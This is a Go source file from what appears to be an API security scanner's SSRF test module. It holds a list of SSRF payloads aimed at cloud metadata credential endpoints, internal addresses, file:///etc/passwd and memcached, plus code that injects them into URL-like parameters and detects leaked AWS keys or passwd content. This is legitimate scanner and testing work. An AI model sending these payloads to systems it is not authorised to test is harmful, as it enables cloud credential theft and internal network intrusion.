package attacks

// API7:2023 — Server Side Request Forgery (SSRF)
// Tests endpoints that accept URLs or hostnames as input,
// attempting to make the server issue requests to internal resources.

import (
	"bytes"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/apisentry/apisentry/internal/parser"
)

// SSRFTest represents an SSRF test case
type SSRFTest struct {
	Name        string
	Method      string
	URL         string
	Headers     map[string]string
	Body        string
	Description string
	Payload     string // the injected SSRF payload
}

// ssrfPayloads are URL/host values that probe for SSRF
var ssrfPayloads = []struct {
	value   string
	desc    string
}{
	{"http://169.254.169.254/latest/meta-data/", "AWS metadata endpoint"},
	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM credentials"},
	{"http://metadata.google.internal/computeMetadata/v1/", "GCP metadata endpoint"},
	{"http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"},
	{"http://localhost/", "localhost redirect"},
	{"http://127.0.0.1/", "loopback IPv4"},
	{"http://[::1]/", "loopback IPv6"},
	{"http://0.0.0.0/", "unspecified address"},
	{"http://192.168.1.1/", "internal network gateway"},
	{"http://10.0.0.1/", "RFC1918 private range"},
	{"file:///etc/passwd", "local file read"},
	{"dict://localhost:11211/", "memcached probe"},
}

// urlParamNames are parameter names that likely accept URLs
var urlParamNames = []string{
	"url", "uri", "href", "src", "source", "redirect",
	"callback", "webhook", "endpoint", "target", "host",
	"proxy", "fetch", "load", "link", "location",
	"return_url", "return_to", "next", "goto",
	"image_url", "avatar_url", "icon_url", "logo_url",
}

// GenerateSSRFTests generates SSRF test cases
func GenerateSSRFTests(endpoints []parser.Endpoint, baseURL string) []SSRFTest {
	var tests []SSRFTest

	for _, ep := range endpoints {
		// Check query/body parameters for URL-like names
		for _, param := range ep.Parameters {
			if isURLParam(param.Name) {
				url := buildEndpointURL(baseURL, ep.Path)
				for _, payload := range ssrfPayloads {
					injectedURL := injectQueryParam(url, param.Name, payload.value)
					tests = append(tests, SSRFTest{
						Name:        fmt.Sprintf("SSRF_%s_%s_%s", ep.Method, sanitizePath(ep.Path), sanitizeParamName(param.Name)),
						Method:      ep.Method,
						URL:         injectedURL,
						Headers:     map[string]string{},
						Description: fmt.Sprintf("SSRF: %s %s — inject %s into param '%s'", ep.Method, ep.Path, payload.desc, param.Name),
						Payload:     payload.value,
					})
				}
			}
		}

		// Check request body properties for URL-like names
		if ep.RequestBody != nil {
			for _, prop := range ep.RequestBody.Properties {
				if isURLParam(prop) {
					url := buildEndpointURL(baseURL, ep.Path)
					for _, payload := range ssrfPayloads[:3] { // top 3 only to avoid noise
						body := fmt.Sprintf(`{"%s": "%s"}`, prop, payload.value)
						tests = append(tests, SSRFTest{
							Name:        fmt.Sprintf("SSRF_BODY_%s_%s_%s", ep.Method, sanitizePath(ep.Path), prop),
							Method:      ep.Method,
							URL:         url,
							Headers:     map[string]string{"Content-Type": "application/json"},
							Body:        body,
							Description: fmt.Sprintf("SSRF: %s %s — inject %s into body field '%s'", ep.Method, ep.Path, payload.desc, prop),
							Payload:     payload.value,
						})
					}
				}
			}
		}
	}

	return tests
}

func isURLParam(name string) bool {
	lower := strings.ToLower(name)
	for _, p := range urlParamNames {
		if lower == p || strings.HasSuffix(lower, "_"+p) || strings.HasSuffix(lower, p+"_url") {
			return true
		}
	}
	return false
}

func sanitizeParamName(name string) string {
	return strings.NewReplacer("_", "-", " ", "-").Replace(name)
}

func injectQueryParam(url, param, value string) string {
	if strings.Contains(url, "?") {
		return url + "&" + param + "=" + value
	}
	return url + "?" + param + "=" + value
}

// ExecuteSSRFTest sends the request and checks for signs of SSRF
func ExecuteSSRFTest(test SSRFTest, token string) (int, string, error) {
	var bodyReader *strings.Reader
	if test.Body != "" {
		bodyReader = strings.NewReader(test.Body)
	} else {
		bodyReader = strings.NewReader("")
	}

	req, err := http.NewRequest(test.Method, test.URL, bodyReader)
	if err != nil {
		return 0, "", err
	}

	for k, v := range test.Headers {
		req.Header.Set(k, v)
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	req.Header.Set("User-Agent", "APISentry-Scanner/1.0")

	client := &http.Client{Timeout: 8 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	var bufBytes bytes.Buffer
	bufBytes.ReadFrom(resp.Body)
	body := bufBytes.String()

	return resp.StatusCode, body, nil
}

// IsSSRFVulnerable checks response for signs of successful SSRF.
// Uses specific patterns that only appear in actual metadata content,
// not in API echo responses that reflect the payload URL.
func IsSSRFVulnerable(statusCode int, body string) bool {
	if statusCode >= 200 && statusCode < 300 {
		lower := strings.ToLower(body)
		// AWS IAM credential response fields (JSON keys in actual credential response)
		if strings.Contains(lower, "\"accesskeyid\"") ||
			strings.Contains(lower, "\"secretaccesskey\"") ||
			// AWS metadata text/plain directory listing format (newline-separated keys)
			strings.Contains(lower, "ami-launch-index") ||
			strings.Contains(lower, "ami-manifest-path") ||
			// GCP metadata response (only appears in actual GCP metadata JSON)
			strings.Contains(lower, "\"computemetadata\"") ||
			strings.Contains(lower, "\"project-id\"") ||
			// /etc/passwd content (very specific format)
			strings.Contains(lower, "root:x:0:0") ||
			strings.Contains(lower, "daemon:x:1:") {
			return true
		}
	}
	return false
}
